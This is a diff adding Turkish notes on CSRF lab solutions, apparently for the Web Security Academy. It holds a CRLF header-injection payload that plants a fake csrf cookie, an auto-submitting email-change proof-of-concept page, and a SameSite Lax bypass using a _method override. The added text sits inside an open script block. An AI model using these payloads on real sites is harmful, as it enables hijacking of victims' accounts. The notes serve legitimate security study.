@@ -44,4 +44,46 @@ csrf parametresini silip sen to request dediğimizde isteğin sunucudan kabul ed
 </form>
 <script>
     document.forms[0].submit();
+
+
+
+
+
+
+
+
+
+
+
+
+6
+Lab: Token'ın çerezde çoğaltıldığı CSRF
+
+Eposta değiştirince csrf doğrulandı ancak arama kısmından bir istek yollandığında korumasız bir şekilde Set-Cookie: içerisinde yansıtıldığnı gördük.
+Arama kısmında csrf koruması olmadığından bunu kurbanın tarayıcısına çerezler enjekte etmek için kullanabiliriz.
+
+/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None => csrf değerini fake olarak değiştirdik ve POC içerisine yerleştirdik.
+<script> bloğunu kaldırıp 1.  <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/> ile bitirdik
+<html>
+    <body>
+        <form method="POST" action="https://$yourlabid.web-security-academy.net/my-account/change-email">
+           <input type="hidden" name="email" value="hacker1@hacker.co">
+            <input type="hidden" name="csrf" value="fake">
+            <input type="submit" value="submit request">
+        </form>
+<img src="https://$yourlabid.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
+    </body>
+</html>
+
+
+7
+Lab: SameSite Lax'ı _method geçersiz kılma yoluyla atlama
+
+email değiştirdikten sonra post isteğini gete çevirip kabul edilmediğini görüyoruz.
+
+POST /my-account/change-email HTTP/2 => değiştirme isteği
+POST /login HTTP/2 => denendi. SameSite = Lax eklendi mi bakıldı.
+GET /my-account/change-email?email=hacker%401hacker.co HTTP/2 => not allowed
+_method=POST ile bu isteği geçiriyoruz.
+GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1 => isteğin geçtiğini görürüz.
 </script>
